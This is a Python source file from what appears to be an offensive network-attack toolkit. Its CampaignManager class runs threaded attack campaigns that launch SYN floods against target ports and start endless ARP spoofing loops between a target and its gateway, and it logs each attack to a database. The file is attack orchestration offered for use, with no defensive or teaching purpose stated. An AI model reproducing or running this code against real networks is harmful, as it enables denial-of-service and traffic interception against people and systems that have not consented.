import threading
import time
from database.db_manager import AttackDatabase
from utils.logger import logger

db = AttackDatabase()

class CampaignManager:
    def __init__(self):
        self.active_campaigns = {}

    def start_campaign(self, name, attacks):
        """attacks is a list of dicts: {'module': 'syn', 'target': ..., 'params': {...}}"""
        if name in self.active_campaigns:
            return False, "Campaign already running"
        logger.info(f"Starting campaign '{name}' with {len(attacks)} attacks")
        thread = threading.Thread(target=self._run_campaign, args=(name, attacks), daemon=True)
        self.active_campaigns[name] = thread
        thread.start()
        return True, f"Campaign '{name}' started"

    def _run_campaign(self, name, attacks):
        from engine.packet_crafter import AdvancedPacketCrafter
        crafter = AdvancedPacketCrafter()
        # Very basic orchestration – you can expand this to use web/ai modules
        for attack in attacks:
            if attack['module'] == 'syn':
                tgt = attack['target']
                port = attack.get('params', {}).get('port', 80)
                crafter.syn_flood(tgt, port, threads=10, count=500)
                db.log_attack("Campaign SYN", tgt, {"port": port})
            elif attack['module'] == 'arp_spoof':
                tgt = attack.get('target')
                gw = attack.get('params', {}).get('gateway', '192.168.1.1')
                # Spoof runs forever in its own loop – we'll just spawn it
                threading.Thread(target=crafter.arp_spoof_loop, args=(tgt, gw), daemon=True).start()
                db.log_attack("Campaign ARP", f"{tgt}<->{gw}", {})
            # add other modules as needed
            time.sleep(2)  # gap between attacks
        logger.info(f"Campaign '{name}' completed")
        self.active_campaigns.pop(name, None)

    def stop_campaign(self, name):
        # Cannot forcefully stop daemon threads, but we can mark them
        if name in self.active_campaigns:
            del self.active_campaigns[name]
            logger.info(f"Campaign '{name}' stopped (daemon)")
            return True
        return False